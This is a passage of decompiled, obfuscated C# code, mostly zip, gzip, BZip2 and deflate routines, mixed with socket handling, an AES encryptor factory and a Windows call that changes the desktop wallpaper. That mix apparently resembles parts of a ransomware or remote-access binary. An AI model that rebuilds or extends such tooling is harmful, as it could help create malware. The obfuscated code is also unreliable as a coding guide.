					class39_0.int_27 = ((class39_0.int_27 << class39_0.int_31 ^ (int)(class39_0.byte_1[class39_0.int_36 + 1] & 255)) & class39_0.int_30);
				}
				if (class39_0.int_38 >= Class39.int_16)
				{
					break;
				}
			}
			while (class39_0.gclass2_0.int_1 != 0);
		}

		static Encoding smethod_213(string string_0, Class8 class8_0)
		{
			switch (Class16.smethod_87(class8_0))
			{
			case Enum9.const_0:
				return Class16.smethod_124(class8_0);
			case Enum9.const_3:
				return Class16.smethod_533(class8_0);
			}
			Encoding encoding = Class16.smethod_124(class8_0);
			if (string_0 == null)
			{
				return encoding;
			}
			byte[] bytes = encoding.GetBytes(string_0);
			string @string = encoding.GetString(bytes, 0, bytes.Length);
			if (@string.Equals(string_0))
			{
				return encoding;
			}
			return Class16.smethod_533(class8_0);
		}

		static void smethod_214(Class39 class39_0, int int_0, int int_1, bool bool_0)
		{
			int num = 0;
			int num2;
			int num3;
			if (class39_0.enum20_0 > Enum20.const_0)
			{
				if ((int)class39_0.sbyte_0 == Class39.int_12)
				{
					Class16.smethod_638(class39_0);
				}
				Class16.smethod_273(class39_0.class47_0, class39_0);
				Class16.smethod_273(class39_0.class47_1, class39_0);
				num = Class16.smethod_433(class39_0);
				num2 = class39_0.int_47 + 3 + 7 >> 3;
				num3 = class39_0.int_48 + 3 + 7 >> 3;
				if (num3 <= num2)
				{
					num2 = num3;
				}
			}
			else
			{
				num3 = (num2 = int_1 + 5);
			}
			if (int_1 + 4 <= num2 && int_0 != -1)
			{
				Class16.smethod_426(class39_0, int_0, int_1, bool_0);
			}
			else if (num3 == num2)
			{
				Class16.smethod_371(class39_0, (Class39.int_8 << 1) + (bool_0 ? 1 : 0), 3);
				short[] short_ = Class50.short_0;
				short[] short_2 = Class50.short_1;
				Class16.smethod_608(short_, short_2, class39_0);
			}
			else
			{
				Class16.smethod_371(class39_0, (Class39.int_9 << 1) + (bool_0 ? 1 : 0), 3);
				int int_2 = class39_0.class47_0.int_6 + 1;
				int int_3 = class39_0.class47_1.int_6 + 1;
				Class16.smethod_527(int_3, class39_0, int_2, num + 1);
				short[] short_ = class39_0.short_2;
				short[] short_2 = class39_0.short_3;
				Class16.smethod_608(short_, short_2, class39_0);
			}
			Class16.smethod_306(class39_0);
			if (bool_0)
			{
				Class16.smethod_508(class39_0);
			}
		}

		static void smethod_215(Class64 class64_0, Socket socket_0)
		{
			if (socket_0 == null)
			{
				throw new ArgumentNullException();
			}
			class64_0.socket_0 = socket_0;
		}

		static void smethod_216(GClass0 gclass0_0)
		{
			if (gclass0_0.enum2_0 == Enum2.const_1 || gclass0_0.enum2_0 == Enum2.const_2 || gclass0_0.enum2_0 == Enum2.const_3 || gclass0_0.enum2_0 == Enum2.const_0)
			{
				return;
			}
			if (gclass0_0.uint_1 != 0u)
			{
				throw new ZipException(string.Format("Cannot extract: Entry {0} is encrypted with an algorithm not supported by DotNetZip: {1}", gclass0_0.string_1, gclass0_0.UnsupportedAlgorithm));
			}
			throw new ZipException(string.Format("Cannot extract: Entry {0} uses an unsupported encryption algorithm ({1:X2})", gclass0_0.string_1, (int)gclass0_0.enum2_0));
		}

		static string smethod_217(ZipSegmentedStream zipSegmentedStream_0)
		{
			return zipSegmentedStream_0.string_3;
		}

		static void smethod_218(GClass1 gclass1_0)
		{
			EventHandler<EventArgs1> eventHandler_ = gclass1_0.eventHandler_1;
			if (eventHandler_ != null)
			{
				EventArgs1 e = Class16.smethod_347(gclass1_0.ArchiveNameForEvent);
				eventHandler_(gclass1_0, e);
			}
		}

		static void smethod_219(GClass1 gclass1_0, ICollection<GClass0> icollection_0)
		{
			if (icollection_0 == null)
			{
				throw new ArgumentNullException("entriesToRemove");
			}
			foreach (GClass0 current in icollection_0)
			{
				Class16.smethod_16(gclass1_0, current);
			}
		}

		static GClass0 smethod_220(Stream stream_0, string string_0, GClass1 gclass1_0)
		{
			Class16.smethod_441(string_0, gclass1_0);
			return Class16.smethod_632(stream_0, string_0, gclass1_0);
		}

		static void smethod_221(int int_0, Class58 class58_0)
		{
			class58_0.int_0 = int_0;
		}

		static string smethod_222(Class57 class57_0)
		{
			return class57_0.string_1;
		}

		static int smethod_223(Class41 class41_0, int int_0)
		{
			for (int i = 0; i < 2; i++)
			{
				int num;
				if (i == 0)
				{
					num = ((class41_0.int_12 <= class41_0.int_13) ? class41_0.int_13 : class41_0.int_11) - class41_0.int_12;
				}
				else
				{
					num = class41_0.int_13 - class41_0.int_12;
				}
				if (num == 0)
				{
					if (int_0 == -5)
					{
						int_0 = 0;
					}
					return int_0;
				}
				if (num > class41_0.gclass2_0.int_3)
				{
					num = class41_0.gclass2_0.int_3;
				}
				if (num != 0 && int_0 == -5)
				{
					int_0 = 0;
				}
				class41_0.gclass2_0.int_3 -= num;
				class41_0.gclass2_0.long_1 += (long)num;
				if (class41_0.object_0 != null)
				{
					class41_0.gclass2_0.uint_0 = (class41_0.uint_0 = Class16.smethod_62(class41_0.uint_0, class41_0.byte_0, class41_0.int_12, num));
				}
				Array.Copy(class41_0.byte_0, class41_0.int_12, class41_0.gclass2_0.byte_1, class41_0.gclass2_0.int_2, num);
				class41_0.gclass2_0.int_2 += num;
				class41_0.int_12 += num;
				if (class41_0.int_12 == class41_0.int_11 && i == 0)
				{
					class41_0.int_12 = 0;
					if (class41_0.int_13 == class41_0.int_11)
					{
						class41_0.int_13 = 0;
					}
				}
				else
				{
					i++;
				}
			}
			return int_0;
		}

		static GClass0 smethod_224(Class8 class8_0, bool bool_0)
		{
			GClass1 gclass1_ = class8_0.gclass1_0;
			Stream stream = Class16.smethod_496(class8_0);
			Encoding encoding_ = Class16.smethod_533(class8_0);
			GClass0 gClass = new GClass0();
			gClass.enum0_0 = Enum0.const_3;
			gClass.class8_0 = class8_0;
			gClass.stream_0 = stream;
			if (gclass1_ != null)
			{
				Class16.smethod_538(null, gclass1_, true);
			}
			if (bool_0)
			{
				Class16.smethod_349(stream);
			}
			if (!Class16.smethod_494(gClass, encoding_))
			{
				return null;
			}
			gClass.long_3 = gClass.ArchiveStream.Position;
			stream.Seek(gClass.long_1 + (long)gClass.int_4, SeekOrigin.Current);
			Class16.smethod_165(gClass);
			if (gclass1_ != null)
			{
				Class16.smethod_457(gclass1_, gClass);
				Class16.smethod_538(gClass, gclass1_, false);
			}
			return gClass;
		}

		static byte[] smethod_225(Class57 class57_0)
		{
			return class57_0.byte_1;
		}

		static bool smethod_226(Stream12 stream12_0)
		{
			return stream12_0.enum22_0 == Enum22.const_0;
		}

		static ICollection<GClass0> smethod_227(string string_0, GClass1 gclass1_0)
		{
			Class17 class17_ = new Class17(string_0, gclass1_0.AddDirectoryWillTraverseReparsePoints);
			return Class16.smethod_270(gclass1_0, class17_);
		}

		static void smethod_228(GClass1 gclass1_0)
		{
			EventHandler<EventArgs2> eventHandler_ = gclass1_0.eventHandler_3;
			if (eventHandler_ != null)
			{
				EventArgs2 eventArgs = Class16.smethod_418(gclass1_0.ArchiveNameForEvent);
				eventHandler_(gclass1_0, eventArgs);
				if (eventArgs.bool_0)
				{
					gclass1_0.bool_10 = true;
				}
			}
		}

		static GClass1 smethod_229(Class8 class8_0)
		{
			return class8_0.gclass1_0;
		}

		static void smethod_230(Form1 form1_0, string string_0)
		{
			Class16.SystemParametersInfo(20u, 0u, string_0, 3u);
		}

		static IEnumerable<string> smethod_231(string string_0)
		{
			return new Form1.Class0(-2)
			{
				string_2 = string_0
			};
		}

		static int smethod_232(Stream0 stream0_0)
		{
			return stream0_0.int_1;
		}

		static void smethod_233(int int_0, GClass3 gclass3_0, int int_1)
		{
			uint[] array = new uint[32];
			uint[] array2 = new uint[32];
			if (int_0 == 0)
			{
				return;
			}
			uint num = ~gclass3_0.uint_2;
			array2[0] = gclass3_0.uint_0;
			uint num2 = 1u;
			for (int i = 1; i < 32; i++)
			{
				array2[i] = num2;
				num2 <<= 1;
			}
			Class16.smethod_266(gclass3_0, array, array2);
			Class16.smethod_266(gclass3_0, array2, array);
			uint num3 = (uint)int_0;
			do
			{
				Class16.smethod_266(gclass3_0, array, array2);
				if ((num3 & 1u) == 1u)
				{
					num = Class16.smethod_678(array, num, gclass3_0);
				}
				num3 >>= 1;
				if (num3 == 0u)
				{
					break;
				}
				Class16.smethod_266(gclass3_0, array2, array);
				if ((num3 & 1u) == 1u)
				{
					num = Class16.smethod_678(array2, num, gclass3_0);
				}
				num3 >>= 1;
			}
			while (num3 != 0u);
			num ^= (uint)int_1;
			gclass3_0.uint_2 = ~num;
		}

		static void smethod_234(Class33 class33_0)
		{
			class33_0.gclass3_0.uint_2 = 4294967295u;
			class33_0.int_1 = -1;
			class33_0.int_2 = 0;
			class33_0.int_3 = -1;
			int num = 256;
			while (--num >= 0)
			{
				class33_0.class34_0.bool_0[num] = false;
			}
		}

		static void smethod_235(GClass1 gclass1_0)
		{
			bool flag = false;
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			GClass0 gClass;
			while ((gClass = Class16.smethod_28(gclass1_0, dictionary)) != null)
			{
				Class16.smethod_276(gClass);
				Class16.smethod_538(null, gclass1_0, true);
				if (gclass1_0.textWriter_0 != null)
				{
					gclass1_0.textWriter_0.WriteLine("entry {0}", gClass.string_1);
				}
				gclass1_0.dictionary_0.Add(gClass.string_1, gClass);
				if (gClass.bool_10)
				{
					flag = true;
				}
				dictionary.Add(gClass.string_1, null);
			}
			if (flag)
			{
				gclass1_0.enum8_0 = Enum8.const_3;
			}
			if (gclass1_0.long_0 > 0L)
			{
				gclass1_0.ReadStream.Seek(gclass1_0.long_0, SeekOrigin.Begin);
			}
			Class16.smethod_360(gclass1_0);
			if (gclass1_0.textWriter_0 != null && !string.IsNullOrEmpty(gclass1_0.string_2))
			{
				gclass1_0.textWriter_0.WriteLine("Zip file Comment: {0}", gclass1_0.string_2);
			}
			if (gclass1_0.textWriter_0 != null)
			{
				gclass1_0.textWriter_0.WriteLine("read in {0} entries.", gclass1_0.dictionary_0.Count);
			}
			Class16.smethod_564(gclass1_0);
		}

		static void smethod_236(Class74.Class77 class77_0, int int_0, int int_1, int int_2)
		{
			while (int_1-- > 0)
			{
				class77_0.byte_0[class77_0.int_0++] = class77_0.byte_0[int_0++];
				class77_0.int_0 &= 32767;
				int_0 &= 32767;
			}
		}

		static void smethod_237(Stream7 stream7_0)
		{
			byte[] array = new byte[]
			{
				66,
				90,
				104,
				0
			};
			array[3] = (byte)(48 + stream7_0.int_1);
			byte[] array2 = array;
			stream7_0.stream_0.Write(array2, 0, array2.Length);
		}

		static void smethod_238(GClass0 gclass0_0)
		{
			gclass0_0.enum2_1 = gclass0_0.enum2_0;
			gclass0_0.short_9 = gclass0_0.short_8;
			gclass0_0.bool_7 = false;
			gclass0_0.bool_6 = false;
			gclass0_0.enum0_0 = Enum0.const_3;
		}

		static Stream smethod_239(Stream stream_0, GClass0 gclass0_0)
		{
			Stream result;
			if (gclass0_0.enum2_1 == Enum2.const_1)
			{
				result = new Stream5(stream_0, gclass0_0.class22_0, Enum5.const_1);
			}
			else
			{
				if (gclass0_0.enum2_1 != Enum2.const_2)
				{
					if (gclass0_0.enum2_1 != Enum2.const_3)
					{
						result = stream_0;
						return result;
					}
				}
				result = new Stream3(stream_0, gclass0_0.class20_0, gclass0_0.long_1, Enum5.const_1);
			}
			return result;
		}

		static string smethod_240(Class54 class54_0)
		{
			return class54_0.string_0;
		}

		static int smethod_241(Class8 class8_0)
		{
			if (class8_0.gclass1_0 != null)
			{
				return class8_0.gclass1_0.int_1;
			}
			if (class8_0.stream1_0 != null)
			{
				throw new NotSupportedException();
			}
			return 0;
		}

		static void smethod_242(long long_0, long long_1, GClass0 gclass0_0)
		{
			if (gclass0_0.class8_0.gclass1_0 != null)
			{
				gclass0_0.bool_12 = Class16.smethod_200(gclass0_0, long_1, long_0, gclass0_0.class8_0.gclass1_0);
			}
		}

		static void smethod_243(Stream6 stream6_0)
		{
			if (stream6_0.stream_0 == null)
			{
				throw new IOException("No input Stream");
			}
			if (!stream6_0.stream_0.CanRead)
			{
				throw new IOException("Unreadable input Stream");
			}
			Class16.smethod_275(stream6_0, 'B', 0);
			Class16.smethod_275(stream6_0, 'Z', 1);
			Class16.smethod_275(stream6_0, 'h', 2);
			int num = stream6_0.stream_0.ReadByte();
			if (num < 49 || num > 57)
			{
				throw new IOException("Stream is not BZip2 formatted: illegal blocksize " + (char)num);
			}
			stream6_0.int_2 = num - 48;
			Class16.smethod_52(stream6_0);
			Class16.smethod_41(stream6_0);
		}

		static void smethod_244(string string_0)
		{
			using (GClass1 gClass = new GClass1())
			{
				gClass.FullScan = true;
				Class16.smethod_192(gClass, string_0);
				Class16.smethod_565(gClass, string_0);
			}
		}

		static void smethod_245(Stream6 stream6_0)
		{
			if (stream6_0.int_8 != stream6_0.int_9)
			{
				stream6_0.int_7 = 1;
				Class16.smethod_60(stream6_0);
				return;
			}
			if (++stream6_0.int_7 >= 4)
			{
				stream6_0.char_0 = (char)(stream6_0.class35_0.byte_5[stream6_0.int_14] & 255);
				stream6_0.int_14 = stream6_0.class35_0.int_6[stream6_0.int_14];
				stream6_0.int_11 = 0;
				Class16.smethod_252(stream6_0);
				return;
			}
			Class16.smethod_60(stream6_0);
		}

		static int smethod_246(Enum20 enum20_0, GClass2 gclass2_0)
		{
			gclass2_0.enum20_0 = enum20_0;
			return Class16.smethod_534(true, gclass2_0);
		}

		static void smethod_247(Stream11 stream11_0)
		{
			stream11_0.queue_0 = new Queue<int>();
			stream11_0.queue_1 = new Queue<int>();
			stream11_0.list_0 = new List<Class46>();
			int num = Stream11.int_1 * Environment.ProcessorCount;
			num = Math.Min(num, stream11_0.int_2);
			for (int i = 0; i < num; i++)
			{
				stream11_0.list_0.Add(new Class46(stream11_0.int_3, stream11_0.enum20_0, stream11_0.method_0(), i));
				stream11_0.queue_1.Enqueue(i);
			}
			stream11_0.autoResetEvent_0 = new AutoResetEvent(false);
			stream11_0.gclass3_0 = new GClass3();
			stream11_0.int_4 = -1;
			stream11_0.int_5 = -1;
			stream11_0.int_6 = -1;
			stream11_0.int_7 = -1;
		}

		static ICryptoTransform smethod_248(byte[] byte_0, byte[] byte_1, bool bool_0)
		{
			ICryptoTransform result;
			using (SymmetricAlgorithm symmetricAlgorithm = new RijndaelManaged())
			{
				result = (bool_0 ? symmetricAlgorithm.CreateDecryptor(byte_1, byte_0) : symmetricAlgorithm.CreateEncryptor(byte_1, byte_0));
			}
			return result;
		}

		static uint smethod_249(uint uint_0)
		{
			uint num = (uint_0 & 1431655765u) << 1 | (uint_0 >> 1 & 1431655765u);
			num = ((num & 858993459u) << 2 | (num >> 2 & 858993459u));
			num = ((num & 252645135u) << 4 | (num >> 4 & 252645135u));
			return num << 24 | (num & 65280u) << 8 | (num >> 8 & 65280u) | num >> 24;
		}

		static IPAddress smethod_250(Class64 class64_0)
		{
			return class64_0.ipaddress_0;
		}

		static uint smethod_251(Exception exception_0)
		{
			return (uint)Marshal.GetHRForException(exception_0);
		}

		static void smethod_252(Stream6 stream6_0)
		{
			if (stream6_0.int_11 < (int)stream6_0.char_0)
			{
				int int_ = stream6_0.int_8;
				stream6_0.int_6 = int_;
				Class16.smethod_623(stream6_0.gclass3_0, (byte)int_);
				stream6_0.int_11++;
				stream6_0.enum11_0 = Stream6.Enum11.const_7;
				return;
			}
			stream6_0.int_10++;
			stream6_0.int_7 = 0;
			Class16.smethod_60(stream6_0);
		}

		static EventArgs4 smethod_253(string string_0, string string_1)
		{
			return new EventArgs4(string_1, Enum6.const_22)
			{
				string_1 = string_0
			};
		}

		static Stream smethod_254(Stream stream_0, GClass0 gclass0_0)
		{
			if (gclass0_0.enum2_0 == Enum2.const_1)
			{
				return new Stream5(stream_0, gclass0_0.class22_1, Enum5.const_0);
			}
			if (gclass0_0.enum2_0 != Enum2.const_2)
			{
				if (gclass0_0.enum2_0 != Enum2.const_3)
				{
					return stream_0;
				}
			}
			return new Stream3(stream_0, gclass0_0.class20_1, Enum5.const_0);
		}

		static int smethod_255(Class55 class55_0)
		{
			return class55_0.int_0;
		}

		static bool smethod_256(Class74.Class75 class75_0)
		{
			int i = Class16.smethod_553(class75_0.class77_0);
			while (i >= 258)
			{
				int num;
				switch (class75_0.int_4)
				{
				case 7:
					while (((num = Class16.smethod_68(class75_0.class78_0, class75_0.class76_0)) & -256) == 0)
					{
						Class16.smethod_468(class75_0.class77_0, num);
						if (--i < 258)
						{
							return true;
						}
					}
					if (num >= 257)
					{
						class75_0.int_6 = Class74.Class75.int_0[num - 257];
						class75_0.int_5 = Class74.Class75.int_1[num - 257];
						goto IL_9E;
					}
					if (num < 0)
					{
						return false;
					}
					class75_0.class78_1 = null;
					class75_0.class78_0 = null;
					class75_0.int_4 = 2;
					return true;
				case 8:
					goto IL_9E;
				case 9:
					goto IL_EE;
				case 10:
					break;
				default:
					continue;
				}
				IL_121:
				if (class75_0.int_5 > 0)
				{
					class75_0.int_4 = 10;
					int num2 = Class16.smethod_45(class75_0.class76_0, class75_0.int_5);
					if (num2 < 0)
					{
						return false;
					}
					Class16.smethod_180(class75_0.class76_0, class75_0.int_5);
					class75_0.int_7 += num2;
				}
				Class16.smethod_588(class75_0.class77_0, class75_0.int_6, class75_0.int_7);
				i -= class75_0.int_6;
				class75_0.int_4 = 7;
				continue;
				IL_EE:
				num = Class16.smethod_68(class75_0.class78_1, class75_0.class76_0);
				if (num >= 0)
				{
					class75_0.int_7 = Class74.Class75.int_2[num];
					class75_0.int_5 = Class74.Class75.int_3[num];
					goto IL_121;
				}
				return false;
				IL_9E:
				if (class75_0.int_5 > 0)
				{
					class75_0.int_4 = 8;
					int num3 = Class16.smethod_45(class75_0.class76_0, class75_0.int_5);
					if (num3 < 0)
					{
						return false;
					}
					Class16.smethod_180(class75_0.class76_0, class75_0.int_5);
					class75_0.int_6 += num3;
				}
				class75_0.int_4 = 9;
				goto IL_EE;
			}
			return true;
		}

		static Stream smethod_257(GClass0 gclass0_0, Stream stream_0)
		{
			short short_ = gclass0_0.short_9;
			if (short_ == 0)
			{
				return stream_0;
			}
			if (short_ == 8)
			{
				return new Stream9(stream_0, Enum22.const_1, true);
			}
			if (short_ != 12)
			{
				return null;
			}
			return new Stream6(stream_0, true);
		}

		static Enum21 smethod_258(Class8 class8_0)
		{
			if (class8_0.gclass1_0 != null)
			{
				return class8_0.gclass1_0.enum21_0;
			}
			return class8_0.stream0_0.method_1();
		}

		static int smethod_259(GClass0 gclass0_0, byte[] byte_0, int int_0, short short_0, long long_0)
		{
			GClass0.Class25 @class = new GClass0.Class25();
			@class.byte_0 = byte_0;
			@class.int_1 = int_0;
			@class.gclass0_0 = gclass0_0;
			if (short_0 != 13 && short_0 != 9 && short_0 != 5)
			{
				throw new BadReadException(string.Format("  Unexpected size (0x{0:X4}) for Extended Timestamp extra field at position 0x{1:X16}", short_0, long_0));
			}
			@class.int_0 = (int)short_0;
			GClass0.Delegate4<DateTime> @delegate = new GClass0.Delegate4<DateTime>(@class.method_0);
			if (short_0 != 13 && gclass0_0.int_5 <= 0)
			{
				Class16.smethod_356(gclass0_0);
			}
			else
			{
				byte b = @class.byte_0[@class.int_1++];
				@class.int_0--;
				if ((b & 1) != 0 && @class.int_0 >= 4)
				{
					gclass0_0.dateTime_1 = @delegate();
				}
				gclass0_0.dateTime_2 = (((b & 2) == 0 || @class.int_0 < 4) ? DateTime.UtcNow : @delegate());
				gclass0_0.dateTime_3 = (((b & 4) == 0 || @class.int_0 < 4) ? DateTime.UtcNow : @delegate());
				gclass0_0.enum7_0 |= Enum7.flag_3;
				gclass0_0.bool_0 = true;
				gclass0_0.bool_2 = true;
			}
			return @class.int_1;
		}

		static void smethod_260(Class62 class62_0, string string_0)
		{
			class62_0.string_3 = string_0;
		}

		static Socket smethod_261(Class61 class61_0)
		{
			return class61_0.socket_1;
		}

		static void smethod_262(Form1.Class0 class0_0)
		{
			class0_0.int_0 = -1;
			if (class0_0.ienumerator_1 != null)
			{
				class0_0.ienumerator_1.Dispose();
			}
		}

		static void smethod_263(GClass1 gclass1_0)
		{
			EventHandler<EventArgs3> eventHandler_ = gclass1_0.eventHandler_0;
			if (eventHandler_ != null)
			{
				EventArgs3 eventArgs = Class16.smethod_282(gclass1_0.ArchiveNameForEvent);
				eventHandler_(gclass1_0, eventArgs);
				if (eventArgs.bool_0)
				{
					gclass1_0.bool_8 = true;
				}
			}
		}

		static void smethod_264(string string_0, string string_1, GClass1 gclass1_0, string string_2)
		{
			Class16.smethod_505(string_0, false, gclass1_0, string_2, string_1);
		}

		static int smethod_265(Enum21 enum21_0, GClass2 gclass2_0, Class39 class39_0, Enum20 enum20_0, int int_0)
		{
			return Class16.smethod_614(Class39.int_1, enum21_0, int_0, gclass2_0, class39_0, enum20_0);
		}

		static void smethod_266(GClass3 gclass3_0, uint[] uint_0, uint[] uint_1)
		{
			for (int i = 0; i < 32; i++)
			{
				uint_0[i] = Class16.smethod_678(uint_1, uint_1[i], gclass3_0);
			}
		}

		static void smethod_267(GClass0 gclass0_0, string string_0)
		{
			if (gclass0_0.class8_0.gclass1_0 != null && !gclass0_0.class8_0.gclass1_0.bool_12)
			{
				gclass0_0.bool_12 = Class16.smethod_117(true, gclass0_0, string_0, gclass0_0.class8_0.gclass1_0);
			}
		}

		static int smethod_268(Stream12 stream12_0)
		{
			int num = 0;
			byte[] array = new byte[10];
			int num2 = stream12_0.stream_0.Read(array, 0, array.Length);
			if (num2 == 0)
			{
				return 0;
			}
			if (num2 != 10)
			{
				throw new GException0("Not a valid GZIP stream.");
			}
			if (array[0] == 31 && array[1] == 139)
			{
				if (array[2] == 8)
				{
					int num3 = BitConverter.ToInt32(array, 4);
					stream12_0.dateTime_0 = Stream10.dateTime_0.AddSeconds((double)num3);
					num += num2;
					if ((array[3] & 4) == 4)
					{
						num2 = stream12_0.stream_0.Read(array, 0, 2);
						num += num2;
						short num4 = (short)((int)array[0] + (int)array[1] * 256);
						byte[] array2 = new byte[(int)num4];
						num2 = stream12_0.stream_0.Read(array2, 0, array2.Length);
						if (num2 != (int)num4)
						{
							throw new GException0("Unexpected end-of-file reading GZIP header.");
						}
						num += num2;
					}
					if ((array[3] & 8) == 8)
					{
						stream12_0.string_0 = Class16.smethod_287(stream12_0);
					}
					if ((array[3] & 16) == 16)
					{
						stream12_0.string_1 = Class16.smethod_287(stream12_0);
					}
					if ((array[3] & 2) == 2)
					{
						stream12_0.Read(stream12_0.byte_1, 0, 1);
					}
					return num;
				}
			}
			throw new GException0("Bad GZIP header.");
		}

		static void smethod_269(Enum6 enum6_0, EventArgs0 eventArgs0_0)
		{
			eventArgs0_0.enum6_0 = enum6_0;
		}

		static ICollection<GClass0> smethod_270(GClass1 gclass1_0, Class17 class17_0)
		{
			if (gclass1_0 == null)
			{
				throw new ArgumentNullException("zip");
			}
			List<GClass0> list = new List<GClass0>();
			using (IEnumerator<GClass0> enumerator = gclass1_0.System.Collections.Generic.IEnumerable<ns15.GClass0>.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					GClass0 current = enumerator.Current;
					if (Class16.smethod_40(class17_0, current))
					{
						list.Add(current);
					}
				}
			}
			return list;
		}

		static void smethod_271(Class61 class61_0, Socket socket_0)
		{
			if (class61_0.socket_0 != null)
			{
				class61_0.socket_0.Close();
			}
			class61_0.socket_0 = socket_0;
		}

		static void smethod_272(Socket socket_0, Class58 class58_0)
		{
			if (socket_0 == null)
			{
				throw new ArgumentNullException();
			}
			class58_0.socket_0 = socket_0;
		}

		static void smethod_273(Class47 class47_0, Class39 class39_0)
		{
			short[] short_ = class47_0.short_0;
			short[] short_2 = class47_0.class50_0.short_2;
			int int_ = class47_0.class50_0.int_2;
			int num = -1;
			class39_0.int_41 = 0;
			class39_0.int_42 = Class47.int_0;
			for (int i = 0; i < int_; i++)
			{
				if (short_[i * 2] != 0)
				{
					num = (class39_0.int_40[++class39_0.int_41] = i);
					class39_0.sbyte_1[i] = 0;
				}
				else
				{
					short_[i * 2 + 1] = 0;
				}
			}
			int num2;
			while (class39_0.int_41 < 2)
			{
				num2 = (class39_0.int_40[++class39_0.int_41] = ((num < 2) ? (++num) : 0));
				short_[num2 * 2] = 1;
				class39_0.sbyte_1[num2] = 0;
				class39_0.int_47--;
				if (short_2 != null)
				{
					class39_0.int_48 -= (int)short_2[num2 * 2 + 1];
				}
			}
			class47_0.int_6 = num;
			for (int i = class39_0.int_41 / 2; i >= 1; i--)
			{
				Class16.smethod_547(class39_0, short_, i);
			}
			num2 = int_;
			do
			{
				int i = class39_0.int_40[1];
				class39_0.int_40[1] = class39_0.int_40[class39_0.int_41--];
				Class16.smethod_547(class39_0, short_, 1);
				int num3 = class39_0.int_40[1];
				class39_0.int_40[--class39_0.int_42] = i;
				class39_0.int_40[--class39_0.int_42] = num3;
				short_[num2 * 2] = short_[i * 2] + short_[num3 * 2];
				class39_0.sbyte_1[num2] = (sbyte)(Math.Max((byte)class39_0.sbyte_1[i], (byte)class39_0.sbyte_1[num3]) + 1);
				short_[i * 2 + 1] = (short_[num3 * 2 + 1] = (short)num2);
				class39_0.int_40[1] = num2++;
				Class16.smethod_547(class39_0, short_, 1);
			}
			while (class39_0.int_41 >= 2);
			class39_0.int_40[--class39_0.int_42] = class39_0.int_40[1];
			Class16.smethod_603(class39_0, class47_0);
			Class16.smethod_141(num, short_, class39_0.short_5);
		}

		static EventArgs4 smethod_274(string string_0, string string_1, GClass0 gclass0_0)
		{
			return new EventArgs4
			{
				string_0 = string_1,
				enum6_0 = Enum6.const_18,
				gclass0_0 = gclass0_0,
				string_1 = string_0
			};
		}

		static void smethod_275(Stream6 stream6_0, char char_0, int int_0)
		{
			int num = stream6_0.stream_0.ReadByte();
			if (num != (int)char_0)
			{
				string message = string.Format("Not a valid BZip2 stream. byte {0}, expected '{1}', got '{2}'", int_0, (int)char_0, num);
				throw new IOException(message);
			}
		}

		static void smethod_276(GClass0 gclass0_0)
		{
			gclass0_0.long_3 = -1L;
			gclass0_0.int_3 = 0;
		}

		static void smethod_277(byte[] byte_0, int[] int_0, Class33.Class34 class34_0, int int_1, int int_2)
		{
			int[] int_3 = class34_0.int_9;
			int[] int_4 = class34_0.int_10;
			int[] int_5 = class34_0.int_11;
			int num = int_1;
			while (--num >= 0)
			{
				int_4[num + 1] = ((int_0[num] == 0) ? 1 : int_0[num]) << 8;
			}
			bool flag = true;
			while (flag)
			{
				flag = false;
				int num2 = int_1;
				int i = 0;
				int_3[0] = 0;
				int_4[0] = 0;
				int_5[0] = -2;
				for (int j = 1; j <= int_1; j++)
				{
					int_5[j] = -1;
					i++;
					int_3[i] = j;
					int num3 = i;
					int num4 = int_3[num3];
					while (int_4[num4] < int_4[int_3[num3 >> 1]])
					{
						int_3[num3] = int_3[num3 >> 1];
						num3 >>= 1;
					}
					int_3[num3] = num4;
				}
				while (i > 1)
				{
					int num5 = int_3[1];
					int_3[1] = int_3[i];
					i--;
					int num6 = 1;
					int num7 = int_3[1];
					while (true)
					{
						int num8 = num6 << 1;
						if (num8 > i)
						{
							break;
						}
						if (num8 < i && int_4[int_3[num8 + 1]] < int_4[int_3[num8]])
						{
							num8++;
						}
						if (int_4[num7] < int_4[int_3[num8]])
						{
							break;
						}
						int_3[num6] = int_3[num8];
						num6 = num8;
					}
					int_3[num6] = num7;
					int num9 = int_3[1];
					int_3[1] = int_3[i];
					i--;
					num6 = 1;
					num7 = int_3[1];
					while (true)
					{
						int num8 = num6 << 1;
						if (num8 > i)
						{
							break;
						}
						if (num8 < i && int_4[int_3[num8 + 1]] < int_4[int_3[num8]])
						{
							num8++;
						}
						if (int_4[num7] < int_4[int_3[num8]])
						{
							break;
						}
						int_3[num6] = int_3[num8];
						num6 = num8;
					}
					int_3[num6] = num7;
					num2++;
					int_5[num5] = (int_5[num9] = num2);
					int num10 = int_4[num5];
					int num11 = int_4[num9];
					int_4[num2] = ((num10 & -256) + (num11 & -256) | 1 + (((num10 & 255) > (num11 & 255)) ? (num10 & 255) : (num11 & 255)));
					int_5[num2] = -1;
					i++;
					int_3[i] = num2;
					num6 = i;
					num7 = int_3[num6];
					int k = int_4[num7];
					while (k < int_4[int_3[num6 >> 1]])
					{
						int_3[num6] = int_3[num6 >> 1];
						num6 >>= 1;
					}
					int_3[num6] = num7;
				}
				for (int l = 1; l <= int_1; l++)
				{
					int num12 = 0;
					int num13 = l;
					int num14;
					while ((num14 = int_5[num13]) >= 0)
					{
						num13 = num14;
						num12++;
					}
					byte_0[l - 1] = (byte)num12;
					if (num12 > int_2)
					{
						flag = true;
					}
				}
				if (flag)
				{
					for (int m = 1; m < int_1; m++)
					{
						int num15 = int_4[m] >> 8;
						num15 = 1 + (num15 >> 1);
						int_4[m] = num15 << 8;
					}
				}
			}
		}

		static void smethod_278(Class64 class64_0, Class61 class61_0)
		{
			if (Class16.smethod_344(class64_0).IndexOf(class61_0) == -1)
			{
				Class16.smethod_344(class64_0).Add(class61_0);
			}
		}

		static Stream11 smethod_279(Class8 class8_0)
		{
			if (class8_0.gclass1_0 != null)
			{
				return class8_0.gclass1_0.stream11_0;
			}
			if (class8_0.stream1_0 != null)
			{
				return null;
			}
			return class8_0.stream0_0.stream11_0;
		}

		static void smethod_280(Stream6 stream6_0)
		{
			if (stream6_0.int_10 <= stream6_0.int_0)
			{
				stream6_0.int_9 = stream6_0.int_8;
				int num = (int)(stream6_0.class35_0.byte_5[stream6_0.int_14] & 255);
				stream6_0.int_14 = stream6_0.class35_0.int_6[stream6_0.int_14];
				if (stream6_0.int_12 == 0)
				{
					stream6_0.int_12 = Class16.smethod_544(stream6_0.int_13) - 1;
					if (++stream6_0.int_13 == 512)
					{
						stream6_0.int_13 = 0;
					}
				}
				else
				{
					stream6_0.int_12--;
				}
